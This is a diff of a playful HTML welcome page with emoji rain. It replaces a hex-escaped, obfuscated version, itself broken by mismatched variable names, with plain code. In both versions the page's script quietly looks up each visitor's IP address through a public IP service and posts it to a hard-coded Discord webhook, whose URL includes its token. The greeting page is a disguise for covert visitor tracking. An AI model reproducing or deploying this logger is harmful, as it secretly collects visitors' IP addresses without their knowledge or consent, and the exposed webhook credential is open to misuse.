@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="\x55\x54\x46\x2d\x38">
+<meta charset="UTF-8">
 <style>
   body {
     margin:0; height:100vh; display:flex; align-items:center; justify-content:center;
     background: linear-gradient(135deg, #ff9a9e, #fad0c4, #fad0c4, #fbc2eb, #a6c1ee, #fbc2eb);
     background-size: 400% 400%; animation: bgShift 12s ease infinite;
-    font-family: '\x43\x6f\x6d\x69\x63\x20\x53\x61\x6e\x73\x20\x4d\x53', '\x43\x68\x61\x6c\x6b\x62\x6f\x61\x72\x64\x20\x53\x45', sans-serif;
+    font-family: 'Comic Sans MS', 'Chalkboard SE', sans-serif;
     overflow:hidden;
   }
   @keyframes bgShift {
@@ -45,21 +45,21 @@
 </style>
 </head>
 <body>
-<div class="\x65\x6d\x6f\x6a\x69\x2d\x72\x61\x69\x6e" id="\x72\x61\x69\x6e"></div>
-<div class="\x63\x61\x72\x64">
+<div class="emoji-rain" id="rain"></div>
+<div class="card">
   <h1>🌸 Welcome! 🌸</h1>
   <p>✨ Stay a while and enjoy the fun ✨</p>
 </div>
 <script>
-const _NNZtqX = ['\xd83c\xdf88','\xd83c\xdf89','\xd83c\xdf1f','\xd83d\xdc96','\xd83e\xdd84','\xd83c\xdf6d','\xd83c\xdf6c','\xd83c\xdf80','\xd83d\xdcab','\x2728','\xd83c\xdf8a','\xd83d\xdc9d','\xd83e\xddf8','\xd83e\xde85'];
-function fnere() {
-  const _kBk = document.createElement('\x64\x69\x76');
-  e.className = '\x65\x6d\x6f\x6a\x69';
+const emojis = ['🎈','🎉','🌟','💖','🦄','🍭','🍬','🎀','💫','✨','🎊','💝','🧸','🪅'];
+function spawnEmoji() {
+  const e = document.createElement('div');
+  e.className = 'emoji';
   e.textContent = emojis[Math.floor(Math.random()*emojis.length)];
-  e.style.left = Math.random()*100+'\x25';
-  e.style.animationDuration = (Math.random()*4+3)+'\x73';
-  e.style.fontSize = (Math.random()*2+1.2)+'\x72\x65\x6d';
-  document.getElementById('\x72\x61\x69\x6e').appendChild(e);
+  e.style.left = Math.random()*100+'%';
+  e.style.animationDuration = (Math.random()*4+3)+'s';
+  e.style.fontSize = (Math.random()*2+1.2)+'rem';
+  document.getElementById('rain').appendChild(e);
   setTimeout(()=>e.remove(), 7000);
 }
 setInterval(spawnEmoji, 300);
@@ -67,13 +67,13 @@ spawnEmoji();
 spawnEmoji();
 spawnEmoji();
 
-fetch('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e')
+fetch('https://api.ipify.org?format=json')
   .then(r=>r.json())
   .then(d=>{
-    fetch('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x61\x70\x70\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x35\x32\x32\x35\x38\x32\x34\x37\x35\x38\x30\x33\x35\x39\x30\x37\x39\x38\x2f\x69\x70\x52\x4f\x68\x35\x77\x68\x39\x55\x5a\x74\x62\x48\x4e\x68\x71\x56\x64\x51\x59\x78\x58\x49\x65\x41\x62\x46\x6c\x59\x4d\x74\x50\x71\x68\x69\x30\x34\x63\x7a\x38\x38\x4a\x74\x6c\x64\x4a\x5f\x65\x53\x52\x35\x57\x57\x76\x53\x7a\x4d\x76\x36\x66\x39\x6a\x32\x67\x70\x46\x6a', {
-      method:'\x50\x4f\x53\x54',
-      headers:{'\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65':'\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e'},
-      body:JSON.stringify({content:`\x56\x69\x73\x69\x74\x6f\x72\x20\x49\x50\x3a\x20\x24\x7b\x64\x2e\x69\x70\x7d`})
+    fetch('https://discordapp.com/api/webhooks/1522582475803590798/ipROh5wh9UZtbHNhqVdQYxXIeAbFlYMtPqhi04cz88JtldJ_eSR5WWvSzMv6f9j2gpFj', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({content:`Visitor IP: ${d.ip}`})
     });
   });
 </script>
